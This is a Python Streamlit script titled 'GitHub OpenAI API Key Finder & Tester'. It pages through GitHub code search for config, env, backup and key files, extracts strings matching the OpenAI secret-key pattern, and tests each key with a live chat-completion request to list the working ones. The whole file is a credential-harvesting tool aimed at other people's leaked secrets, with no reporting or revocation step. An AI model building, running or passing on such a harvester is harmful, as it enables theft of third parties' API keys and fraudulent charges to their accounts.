import os
import requests
import aiohttp
import asyncio
import re
import logging
import getpass
import streamlit as st
from requests.auth import HTTPBasicAuth

# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Function to search GitHub for potential OpenAI API keys
def search_github(query, username, password, page=1):
    headers = {
        'Accept': 'application/vnd.github.v3+json'
    }
    params = {'q': query, 'per_page': 100, 'page': page}
    response = requests.get('https://api.github.com/search/code', headers=headers, params=params, auth=HTTPBasicAuth(username, password))
    response.raise_for_status()
    return response.json()

# Function to extract keys from the search results
def extract_keys(search_results):
    key_pattern = re.compile(r'sk-[a-zA-Z0-9]{48}')
    keys = set()
    for item in search_results.get('items', []):
        content_url = item['url']
        response = requests.get(content_url, headers={'Authorization': f'token {os.getenv("GITHUB_TOKEN")}'})
        response.raise_for_status()
        matches = key_pattern.findall(response.text)
        keys.update(matches)
    return list(keys)

# Function to test OpenAI keys
async def test_key(session, key):
    headers = {
        'Authorization': f'Bearer {key}',
        'Content-Type': 'application/json'
    }
    data = {
        'model': 'gpt-3.5-turbo',
        'messages': [{'role': 'user', 'content': 'Say this is a test'}]
    }
    async with session.post('https://api.openai.com/v1/chat/completions', headers=headers, json=data) as response:
        if response.status == 200:
            return key
        return None

async def test_keys(keys):
    async with aiohttp.ClientSession() as session:
        tasks = [test_key(session, key) for key in keys]
        results = await asyncio.gather(*tasks)
        return [key for key in results if key is not None]

# Function to handle pagination
def handle_pagination(query, username, password):
    page = 1
    all_keys = set()
    while True:
        search_results = search_github(query, username, password, page)
        if not search_results.get('items'):
            break
        keys = extract_keys(search_results)
        all_keys.update(keys)
        page += 1
    return list(all_keys)

# Streamlit UI
st.title("GitHub OpenAI API Key Finder & Tester")

# Get GitHub credentials
username = st.text_input("Enter your GitHub username:")
password = st.text_input("Enter your GitHub password:", type='password')

if st.button("Search and Test Keys"):
    if not username or not password:
        st.error("Please provide both GitHub username and password.")
    else:
        st.spinner("Searching GitHub for potential OpenAI API keys...")
        search_query = """
        (path:*.xml OR path:*.json OR path:*.properties OR path:*.sql OR path:*.txt OR path:*.log OR path:*.tmp OR path:*.backup OR path:*.bak OR path:*.enc OR path:*.yml OR path:*.yaml OR path:*.toml OR path:*.ini OR path:*.config OR path:*.conf OR path:*.cfg OR path:*.env OR path:*.envrc OR path:*.prod OR path:*.secret OR path:*.private OR path:*.key) AND 
        (access_key OR secret_key OR access_token OR api_key OR apikey OR api_secret OR apiSecret OR app_secret OR application_key OR app_key OR appkey OR auth_token OR authsecret) AND 
        (/sk-[a-zA-Z0-9]{48}/ AND (openai OR gpt))
        """
        keys = handle_pagination(search_query, username, password)
        
        st.write(f"Found {len(keys)} potential keys.")

        if keys:
            st.spinner("Testing keys...")
            loop = asyncio.get_event_loop()
            valid_keys = loop.run_until_complete(test_keys(keys))
            
            st.write(f"Found {len(valid_keys)} valid keys.")
            st.write(valid_keys)
        else:
            st.write("No keys found.")
